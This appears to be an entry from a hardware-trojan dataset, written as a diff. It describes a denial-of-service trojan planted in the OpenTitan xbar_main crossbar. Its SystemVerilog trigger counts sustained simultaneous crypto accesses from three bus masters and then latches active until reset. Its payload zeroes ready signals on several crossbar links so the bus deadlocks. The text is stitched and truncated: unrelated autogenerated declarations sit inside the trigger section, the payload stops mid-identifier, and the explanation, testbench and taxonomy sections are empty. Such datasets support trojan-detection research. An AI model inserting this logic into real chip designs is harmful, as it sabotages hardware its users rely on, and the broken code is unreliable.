@@ -1,0 +1,325 @@
+Trojan ID: trojan_3
+Name: Bus Lockup
+Type: denial_of_service
+Target Module: xbar_main
+Target File: hw/top_earlgrey/ip/xbar_main/rtl/autogen/xbar_main.sv
+
+EXPLANATION:
+
+
+TRIGGER:
+Simultaneous crypto accesses from all three masters
+  wire trojan_pattern = corei_crypto_access && cored_crypto_access && sba_crypto_access;
+  
+  // Pattern counter for stealth (requires pattern to persist for 16 cycles)
+  always_ff @(posedge clk_main_i or negedge rst_main_ni) begin
+    if (!rst_main_ni) begin
+      trojan_trigger_counter <= 16'h0;
+      trojan_triggered <= 1'b0;
+    end else begin
+      if (trojan_pattern) begin
+        trojan_trigger_counter <= trojan_trigger_counter + 1'b1;
+        if (trojan_trigger_counter == 16'hFFF0) begin
+          trojan_triggered <= 1'b1;
+        end
+      end else begin
+        trojan_trigger_counter <= 16'h0;
+      end
+    end
+  end
+  
+  // Once triggered, remain active until reset
+  always_ff @(posedge clk_main_i or negedge rst_main_ni) begin
+    if (!rst_main_ni) begin
+      trojan_active <= 1'b0;
+    end else begin
+      if (trojan_triggered) begin
+        trojan_active <= 1'b1;
+      end
+    end
+  end
+  // END TROJAN LOGIC
+
+  tl_h2d_t tl_s1n_27_us_h2d ;
+  tl_d2h_t tl_s1n_27_us_d2h ;
+
+
+  tl_h2d_t tl_s1n_27_ds_h2d [4];
+  tl_d2h_t tl_s1n_27_ds_d2h [4];
+
+  // Create steering signal
+  logic [2:0] dev_sel_s1n_27;
+
+
+  tl_h2d_t tl_sm1_28_us_h2d [3];
+  tl_d2h_t tl_sm1_28_us_d2h [3];
+
+  tl_h2d_t tl_sm1_28_ds_h2d ;
+  tl_d2h_t tl_sm1_28_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_29_us_h2d [3];
+  tl_d2h_t tl_sm1_29_us_d2h [3];
+
+  tl_h2d_t tl_sm1_29_ds_h2d ;
+  tl_d2h_t tl_sm1_29_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_30_us_h2d [3];
+  tl_d2h_t tl_sm1_30_us_d2h [3];
+
+  tl_h2d_t tl_sm1_30_ds_h2d ;
+  tl_d2h_t tl_sm1_30_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_31_us_h2d [3];
+  tl_d2h_t tl_sm1_31_us_d2h [3];
+
+  tl_h2d_t tl_sm1_31_ds_h2d ;
+  tl_d2h_t tl_sm1_31_ds_d2h ;
+
+  tl_h2d_t tl_s1n_32_us_h2d ;
+  tl_d2h_t tl_s1n_32_us_d2h ;
+
+
+  tl_h2d_t tl_s1n_32_ds_h2d [24];
+  tl_d2h_t tl_s1n_32_ds_d2h [24];
+
+  // Create steering signal
+  logic [4:0] dev_sel_s1n_32;
+
+
+  tl_h2d_t tl_sm1_33_us_h2d [2];
+  tl_d2h_t tl_sm1_33_us_d2h [2];
+
+  tl_h2d_t tl_sm1_33_ds_h2d ;
+  tl_d2h_t tl_sm1_33_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_34_us_h2d [2];
+  tl_d2h_t tl_sm1_34_us_d2h [2];
+
+  tl_h2d_t tl_sm1_34_ds_h2d ;
+  tl_d2h_t tl_sm1_34_ds_d2h ;
+
+  tl_h2d_t tl_asf_35_us_h2d ;
+  tl_d2h_t tl_asf_35_us_d2h ;
+  tl_h2d_t tl_asf_35_ds_h2d ;
+  tl_d2h_t tl_asf_35_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_36_us_h2d [2];
+  tl_d2h_t tl_sm1_36_us_d2h [2];
+
+  tl_h2d_t tl_sm1_36_ds_h2d ;
+  tl_d2h_t tl_sm1_36_ds_d2h ;
+
+  tl_h2d_t tl_asf_37_us_h2d ;
+  tl_d2h_t tl_asf_37_us_d2h ;
+  tl_h2d_t tl_asf_37_ds_h2d ;
+  tl_d2h_t tl_asf_37_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_38_us_h2d [2];
+  tl_d2h_t tl_sm1_38_us_d2h [2];
+
+  tl_h2d_t tl_sm1_38_ds_h2d ;
+  tl_d2h_t tl_sm1_38_ds_d2h ;
+
+  tl_h2d_t tl_asf_39_us_h2d ;
+  tl_d2h_t tl_asf_39_us_d2h ;
+  tl_h2d_t tl_asf_39_ds_h2d ;
+  tl_d2h_t tl_asf_39_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_40_us_h2d [2];
+  tl_d2h_t tl_sm1_40_us_d2h [2];
+
+  tl_h2d_t tl_sm1_40_ds_h2d ;
+  tl_d2h_t tl_sm1_40_ds_d2h ;
+
+  tl_h2d_t tl_asf_41_us_h2d ;
+  tl_d2h_t tl_asf_41_us_d2h ;
+  tl_h2d_t tl_asf_41_ds_h2d ;
+  tl_d2h_t tl_asf_41_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_42_us_h2d [2];
+  tl_d2h_t tl_sm1_42_us_d2h [2];
+
+  tl_h2d_t tl_sm1_42_ds_h2d ;
+  tl_d2h_t tl_sm1_42_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_43_us_h2d [2];
+  tl_d2h_t tl_sm1_43_us_d2h [2];
+
+  tl_h2d_t tl_sm1_43_ds_h2d ;
+  tl_d2h_t tl_sm1_43_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_44_us_h2d [2];
+  tl_d2h_t tl_sm1_44_us_d2h [2];
+
+  tl_h2d_t tl_sm1_44_ds_h2d ;
+  tl_d2h_t tl_sm1_44_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_45_us_h2d [2];
+  tl_d2h_t tl_sm1_45_us_d2h [2];
+
+  tl_h2d_t tl_sm1_45_ds_h2d ;
+  tl_d2h_t tl_sm1_45_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_46_us_h2d [2];
+  tl_d2h_t tl_sm1_46_us_d2h [2];
+
+  tl_h2d_t tl_sm1_46_ds_h2d ;
+  tl_d2h_t tl_sm1_46_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_47_us_h2d [2];
+  tl_d2h_t tl_sm1_47_us_d2h [2];
+
+  tl_h2d_t tl_sm1_47_ds_h2d ;
+  tl_d2h_t tl_sm1_47_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_48_us_h2d [2];
+  tl_d2h_t tl_sm1_48_us_d2h [2];
+
+  tl_h2d_t tl_sm1_48_ds_h2d ;
+  tl_d2h_t tl_sm1_48_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_49_us_h2d [2];
+  tl_d2h_t tl_sm1_49_us_d2h [2];
+
+  tl_h2d_t tl_sm1_49_ds_h2d ;
+  tl_d2h_t tl_sm1_49_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_50_us_h2d [2];
+  tl_d2h_t tl_sm1_50_us_d2h [2];
+
+  tl_h2d_t tl_sm1_50_ds_h2d ;
+  tl_d2h_t tl_sm1_50_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_51_us_h2d [2];
+  tl_d2h_t tl_sm1_51_us_d2h [2];
+
+  tl_h2d_t tl_sm1_51_ds_h2d ;
+  tl_d2h_t tl_sm1_51_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_52_us_h2d [2];
+  tl_d2h_t tl_sm1_52_us_d2h [2];
+
+  tl_h2d_t tl_sm1_52_ds_h2d ;
+  tl_d2h_t tl_sm1_52_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_53_us_h2d [2];
+  tl_d2h_t tl_sm1_53_us_d2h [2];
+
+  tl_h2d_t tl_sm1_53_ds_h2d ;
+  tl_d2h_t tl_sm1_53_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_54_us_h2d [2];
+  tl_d2h_t tl_sm1_54_us_d2h [2];
+
+  tl_h2d_t tl_sm1_54_ds_h2d ;
+  tl_d2h_t tl_sm1_54_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_55_us_h2d [2];
+  tl_d2h_t tl_sm1_55_us_d2h [2];
+
+  tl_h2d_t tl_sm1_55_ds_h2d ;
+  tl_d2h_t tl_sm1_55_ds_d2h ;
+
+
+  tl_h2d_t tl_sm1_56_us_h2d [2];
+  tl_d2h_t tl_sm1_56_us_d2h [2];
+
+  tl_h2d_t tl_sm1_56_ds_h2d ;
+  tl_d2h_t tl_sm1_56_ds_d2h ;
+
+  tl_h2d_t tl_s1n_57_us_h2d ;
+  tl_d2h_t tl_s1n_57_us_d2h ;
+
+
+  tl_h2d_t tl_s1n_57_ds_h2d [24];
+  tl_d2h_t tl_s1n_57_ds_d2h [24];
+
+  // Create steering signal
+  logic [4:0] dev_sel_s1n_57;
+
+  // TROJAN
+
+PAYLOAD:
+Corrupt ready signals when active
+  // This creates bus deadlocks by preventing transaction completion
+  wire trojan_ready_block = trojan_active;
+
+  assign tl_sm1_28_us_h2d[0] = tl_s1n_27_ds_h2d[0];
+  assign tl_s1n_27_ds_d2h[0] = trojan_ready_block ? 
+    {tl_sm1_28_us_d2h[0].d_valid, tl_sm1_28_us_d2h[0].d_opcode, 
+     tl_sm1_28_us_d2h[0].d_param, tl_sm1_28_us_d2h[0].d_size, 
+     tl_sm1_28_us_d2h[0].d_source, tl_sm1_28_us_d2h[0].d_sink, 
+     tl_sm1_28_us_d2h[0].d_data, tl_sm1_28_us_d2h[0].d_user, 
+     tl_sm1_28_us_d2h[0].d_error, 1'b0} : tl_sm1_28_us_d2h[0];
+
+  assign tl_sm1_29_us_h2d[0] = tl_s1n_27_ds_h2d[1];
+  assign tl_s1n_27_ds_d2h[1] = trojan_ready_block ? 
+    {tl_sm1_29_us_d2h[0].d_valid, tl_sm1_29_us_d2h[0].d_opcode, 
+     tl_sm1_29_us_d2h[0].d_param, tl_sm1_29_us_d2h[0].d_size, 
+     tl_sm1_29_us_d2h[0].d_source, tl_sm1_29_us_d2h[0].d_sink, 
+     tl_sm1_29_us_d2h[0].d_data, tl_sm1_29_us_d2h[0].d_user, 
+     tl_sm1_29_us_d2h[0].d_error, 1'b0} : tl_sm1_29_us_d2h[0];
+
+  assign tl_sm1_30_us_h2d[0] = tl_s1n_27_ds_h2d[2];
+  assign tl_s1n_27_ds_d2h[2] = trojan_ready_block ? 
+    {tl_sm1_30_us_d2h[0].d_valid, tl_sm1_30_us_d2h[0].d_opcode, 
+     tl_sm1_30_us_d2h[0].d_param, tl_sm1_30_us_d2h[0].d_size, 
+     tl_sm1_30_us_d2h[0].d_source, tl_sm1_30_us_d2h[0].d_sink, 
+     tl_sm1_30_us_d2h[0].d_data, tl_sm1_30_us_d2h[0].d_user, 
+     tl_sm1_30_us_d2h[0].d_error, 1'b0} : tl_sm1_30_us_d2h[0];
+
+  assign tl_sm1_31_us_h2d[0] = tl_s1n_27_ds_h2d[3];
+  assign tl_s1n_27_ds_d2h[3] = tl_sm1_31_us_d2h[0];
+
+  assign tl_sm1_28_us_h2d[1] = tl_s1n_32_ds_h2d[0];
+  assign tl_s1n_32_ds_d2h[0] = tl_sm1_28_us_d2h[1];
+
+  assign tl_sm1_33_us_h2d[0] = tl_s1n_32_ds_h2d[1];
+  assign tl_s1n_32_ds_d2h[1] = tl_sm1_33_us_d2h[0];
+
+  assign tl_sm1_29_us_h2d[1] = tl_s1n_32_ds_h2d[2];
+  assign tl_s1n_32_ds_d2h[2] = tl_sm1_29_us_d2h[1];
+
+  assign tl_sm1_34_us_h2d[0] = tl_s1n_32_ds_h2d[3];
+  assign tl_s1n_32_ds_d2h[3] = tl_sm1_34_us_d2h[0];
+
+  assign tl_sm1_30_us_h2d[1] = tl_s1n_32_ds_h2d[4];
+  assign tl_s1n_32_ds_d2h[4] = tl_sm1_30_us_d2h[1];
+
+  assign tl_sm1_36_us_h2d[0] = tl_s1n_32_ds_h2d[5];
+  assign tl_s1n_32_ds_d2h[5] = tl_sm1_36_us_d2h[0];
+
+  assign tl_sm1_38_us_h2d[0] = tl_s1n_32_ds_h2d[6];
+  assign tl_s1n_32_ds_d2h[6] = tl_sm1_38_us_d2h[0];
+
+  assign tl_sm1_40_us_h2d[0] = tl_s1n_32_ds_h2d[7];
+  assign tl_s1n_32_ds_d2h[7] = tl_sm1_40_us_d2h[0];
+
+  assign tl_sm1_42_us_h2d[0] = tl
+
+TESTBENCH STRATEGY:
+
+
+TAXONOMY:
+
